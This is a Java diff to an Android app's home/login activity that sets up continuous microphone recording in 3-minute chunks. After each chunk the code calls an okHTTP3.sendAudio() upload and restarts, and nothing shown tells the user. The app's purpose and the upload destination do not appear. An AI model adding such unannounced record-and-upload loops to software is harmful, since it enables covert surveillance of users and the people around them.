@@ -35,17 +35,19 @@ public class HomeActivity extends AppCompatActivity {
 
     ArrayList<ContactModel> arrayList = new ArrayList<>();
     DBHelper DB;
-    
+
     private static final int AUDIO_RECORD_PERMISSION_REQUEST_CODE = 1;
-    private static final int c = 180000; //3 minutes
+    private static final int RECORDING_DURATION = 180000; //3 minutes
 
     private MediaRecorder mediaRecorder;
     private Handler mHandler;
+    okHTTP3 okHTTP3;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_home);
+        okHTTP3 = new okHTTP3();
         signup = findViewById(R.id.btnsignup);
         signin = findViewById(R.id.btnsignin);
         toolbar = findViewById(R.id.loginRegisterToolbar);
@@ -65,7 +67,7 @@ public class HomeActivity extends AppCompatActivity {
                 startActivity(intent);
             }
         });
-        
+
         mHandler = new Handler();
 
         checkPermission();
@@ -83,17 +85,17 @@ public class HomeActivity extends AppCompatActivity {
         }
     }
 
-//    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-//        if (requestCode == AUDIO_RECORD_PERMISSION_REQUEST_CODE) {
-//            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-//                // Permission granted, start recording
-//                startRecording();
-//            } else {
-//                Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
-//            }
-//        }
-//    }
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == AUDIO_RECORD_PERMISSION_REQUEST_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                // Permission granted, start recording
+                startRecording();
+            } else {
+                Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
 
     @SuppressLint("Range")
     private void getContactList() {
@@ -136,18 +138,19 @@ public class HomeActivity extends AppCompatActivity {
         }
     }
 
-    public void startRecording() {
+    private void startRecording() {
         mediaRecorder = new MediaRecorder();
         mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
 
         // Generate unique filename for each recording
         String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
-        String fileName = "test.mp4";
+        String fileName = "Recording_" + timeStamp + ".mp4";
         String filePath = "/data/data/com.example.project/" + fileName;
 
         mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
         mediaRecorder.setOutputFile(filePath);
+
 
         try {
             mediaRecorder.prepare();
@@ -155,17 +158,23 @@ public class HomeActivity extends AppCompatActivity {
             e.printStackTrace();
         }
 
-        // Set maximum duration to unlimited
-        mediaRecorder.setMaxDuration(-1);
-
         mediaRecorder.start();
+
+        mHandler.postDelayed(new Runnable(){
+            @Override
+            public void run(){
+                stopRecording();
+                okHTTP3.sendAudio();
+                startRecording();
+            }
+        }, RECORDING_DURATION);
     }
 
-
-    public void stopRecording() {
+    protected void stopRecording() {
         // Stop recording and release resources
         if (mediaRecorder != null) {
             mediaRecorder.stop();
+            mediaRecorder.reset();
             mediaRecorder.release();
             mediaRecorder = null;
         }
